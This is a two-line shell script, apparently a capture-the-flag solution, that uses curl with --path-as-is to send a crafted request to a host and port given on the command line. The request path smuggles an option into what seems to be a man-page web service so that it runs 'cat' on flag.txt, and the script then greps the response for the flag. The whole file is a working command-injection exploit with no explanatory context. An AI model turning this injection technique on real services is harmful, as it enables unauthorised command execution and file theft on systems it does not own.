#!/bin/sh
curl --path-as-is "http://$1:$2/-x/--html=cat%20$%7BPWD%app%7Dflag.txt/man" | grep oiccflag
